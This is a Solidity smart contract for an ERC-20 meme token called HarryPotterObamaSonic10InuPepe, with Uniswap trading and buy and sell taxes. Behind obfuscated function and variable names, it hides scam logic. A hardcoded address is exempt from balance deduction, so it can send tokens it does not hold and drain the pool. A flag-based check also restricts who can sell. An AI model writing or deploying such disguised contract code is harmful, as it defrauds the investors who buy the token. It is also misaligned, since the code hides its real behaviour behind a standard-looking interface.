/**
 *Submitted for verification at Etherscan.io on 2023-09-10
*/

/*

HarryPotterObamaSonic10InuPepe  $PEPE


Twitter: https://twitter.com/HPepe_erc
Telegram: https://t.me/HPepe_erc20
Website: https://www.hpepe.org/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  qkrhr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qkrhr(a, b, "SafeMath");
    }

    function  qkrhr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2sFactorys {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2sRouters {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract HarryPotterObamaSonic10InuPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"HarryPotterObamaSonic10InuPepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 42069000000 * (10**_decimals);
    uint256 public _taxkSwapltap = _totalSupply;
    uint256 public _maxsHoldsAmount = _totalSupply;
    uint256 public _taxSwapsThreshold = _totalSupply;
    uint256 public _taxSwapuMaxs = _totalSupply;

    uint256 private _initialBuyTax=9;
    uint256 private _initialSellTax=18;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTax6At=1;
    uint256 private _swpwpasruir=0;
    uint256 private _yeqxrtop=0;
    address public  _uacgvuksrq = 0x3Ebf89B4AeF0A7cee03FB48c0054299692F69162;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _revdtarxes;
    mapping (address => bool) private  _rvoufaejt;
    mapping(address => uint256) private  _oqyTransfvswp;
    bool public  transerDelyEnble = false;


    IUniswapV2sRouters private  _unisV2Routers;
    address private  _unisV2sLPs;
    bool private  _wtmyuaesk;
    bool private  _insTaxuSwap = false;
    bool private  _spxUniVwaptw = false;
 
 
    event RtsuAnkblxr(uint _taxkSwapltap);
    modifier locksToxSwaps {
        _insTaxuSwap = true;
        _;
        _insTaxuSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _revdtarxes[owner()] = true;
        _revdtarxes[address(this)] = true;
        _revdtarxes[_uacgvuksrq] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. qkrhr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (transerDelyEnble) {
                if  (to!= address(_unisV2Routers) &&to!= address(_unisV2sLPs)) {
                  require (_oqyTransfvswp[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _oqyTransfvswp[tx.origin] = block.number;
                }
            }

            if  ( from == _unisV2sLPs && to!= address (_unisV2Routers) &&!_revdtarxes[to]) {
                require (amount <= _taxkSwapltap, "Farbids");
                require (balanceOf (to) + amount <= _maxsHoldsAmount,"Farbids");
                if  (_yeqxrtop < _swpwpasruir) {
                  require (!rqkpiyuve(to));
                }
                _yeqxrtop ++ ; _rvoufaejt[to] = true;
                taxAmount = amount.mul((_yeqxrtop > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _unisV2sLPs&&from!= address (this) &&! _revdtarxes[from]) {
                require (amount <= _taxkSwapltap && balanceOf(_uacgvuksrq) <_taxSwapuMaxs, "Farbids");
                taxAmount = amount.mul((_yeqxrtop > _reduceSellTax6At) ?_finalSellTax:_initialSellTax).div(100);
                require (_yeqxrtop >_swpwpasruir && _rvoufaejt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_insTaxuSwap 
            &&  to  ==_unisV2sLPs&&_spxUniVwaptw &&contractTokenBalance > _taxSwapsThreshold 
            &&  _yeqxrtop > _swpwpasruir &&! _revdtarxes [to] &&! _revdtarxes [from]
            )  {
                _transferFrom(uhxdl(amount,uhxdl(contractTokenBalance, _taxSwapuMaxs)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = qkrhr(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qkrhr (taxAmount));
        emit  Transfer( from, to, amount. qkrhr(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private locksToxSwaps {
        if(_swapTaxAndLiquify==0){return;}
        if(!_wtmyuaesk){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _unisV2Routers.WETH();
        _approve(address (this), address (_unisV2Routers), _swapTaxAndLiquify);
        _unisV2Routers.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function uhxdl(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function qkrhr(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _uacgvuksrq) {
        return a;
    } else {
        require(a >= b, "Farbids");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _taxkSwapltap  =  _totalSupply ;
        _maxsHoldsAmount = _totalSupply ;
        transerDelyEnble = false ;
        emit  RtsuAnkblxr ( _totalSupply ) ;
    }

   function rqkpiyuve(address account) private view returns (bool) {
    uint256 codeSize;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly {
        codeSize := extcodesize(account)
    }

    return codeSize > 0;
    }


    function openTrading() external onlyOwner() {
        require (!_wtmyuaesk, "trading  is  open") ;
        _unisV2Routers = IUniswapV2sRouters (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve (address (this),address(_unisV2Routers), _totalSupply);
        _unisV2sLPs = IUniswapV2sFactorys(_unisV2Routers.factory()).createPair (address(this), _unisV2Routers. WETH());
        _unisV2Routers.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_unisV2sLPs).approve (address(_unisV2Routers), type(uint). max);
        _spxUniVwaptw = true ;
        _wtmyuaesk = true ;
    }

    receive( )  external  payable  { }
    }